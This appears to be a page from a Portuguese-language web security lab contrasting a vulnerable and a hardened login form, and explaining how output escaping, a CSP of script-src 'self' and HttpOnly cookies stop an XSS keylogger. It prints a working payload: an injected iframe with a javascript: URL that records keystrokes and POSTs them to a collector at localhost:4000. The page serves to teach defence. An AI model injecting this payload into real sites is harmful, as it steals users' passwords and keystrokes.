⌨️ Keylogger via XSS

Captura de teclas por script injetado — bloqueada antes de a captura existir

KEYLOGGER

Simulação de Login

Digite algo nos campos abaixo como se estivesse fazendo login. No ambiente vulnerável, um payload XSS instalaria um listener keydown e enviaria cada tecla ao C2 (localhost:4000). Aqui, esse payload nunca executa — então não há keylogger para capturar nada. O contador abaixo mostra apenas o que seria roubado, sem nenhum envio à rede.

Nenhum keylogger ativo — payload XSS bloqueado pelo CSP.
Teclas que um atacante teria capturado: 0  |  Enviadas ao C2: 0

Comparação: Vulnerável vs Seguro

❌ Código Vulnerável (:3000)

// XSS injetado executa este script:
<iframe src="javascript:(function(){
  var b='';
  top.document.addEventListener('keydown',function(e){
    b += e.key;                 // acumula cada tecla
    if(b.length > 30){          // a cada 30 chars...
      fetch('http://localhost:4000/capture',{
        method:'POST', mode:'no-cors',
        body: JSON.stringify({type:'keylog', keylog:b})
      });                       // → envia ao C2
      b='';
    }
  });
})()">

O script injetado registra um listener global e exfiltra senhas em tempo real enquanto a vítima digita.

✅ Código Seguro (este ambiente)

// 1) O <iframe javascript:> é ESCAPADO na saída
//    (escapeHtml) → vira texto, não tag.
// 2) Mesmo se passasse, o CSP barra a execução:
//    Content-Security-Policy: script-src 'self'
//    → bloqueia inline e o esquema javascript:
// 3) Sem execução, NENHUM addEventListener é
//    registrado. Não existe keylogger.

// Este arquivo (keylog-safe.js) é servido de
// 'self' e apenas CONTA teclas localmente,
// sem nenhum fetch() para a rede.

A defesa não "limpa" as teclas: ela impede que o código que capturaria as teclas chegue a rodar.

🛡️ Defesas Aplicadas Aqui

✅
CSP script-src 'self' Bloqueia scripts inline e o esquema javascript: — o payload do keylogger nunca executa.
✅
Escape de Saída (Output Encoding) O <iframe> que entregaria o keylogger é convertido em texto antes de chegar ao HTML. 
function escapeHtml(str) {
  return String(str)                    // ① garante que é texto
    .replace(/&/g, '&amp;')             // ② troca  &  por  &amp;
    .replace(/</g, '&lt;')              // ③ troca  <  por  &lt;
    .replace(/>/g, '&gt;')              // ④ troca  >  por  &gt;
    .replace(/"/g, '&quot;')            // ⑤ troca  "  por  &quot;
    .replace(/'/g, '&#x27;');           // ⑥ troca  '  por  &#x27;
}
✅
Cookie HttpOnly (defesa em profundidade) Ainda que algo executasse, document.cookie não expõe a sessão para acompanhar as teclas.
